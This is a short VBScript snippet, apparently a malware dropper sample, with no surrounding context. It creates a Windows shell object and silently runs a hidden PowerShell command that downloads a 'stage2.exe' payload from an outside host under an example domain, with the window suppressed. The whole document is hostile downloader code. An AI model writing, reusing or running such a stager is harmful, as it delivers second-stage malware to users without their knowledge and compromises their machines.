Dim shell, url
url = "http://dl.encoded-vbs.example.com/stage2.exe"
Set shell = CreateObject("WScript.Shell")
shell.Run "cmd /c powershell -w hidden -c iwr " & url, 0
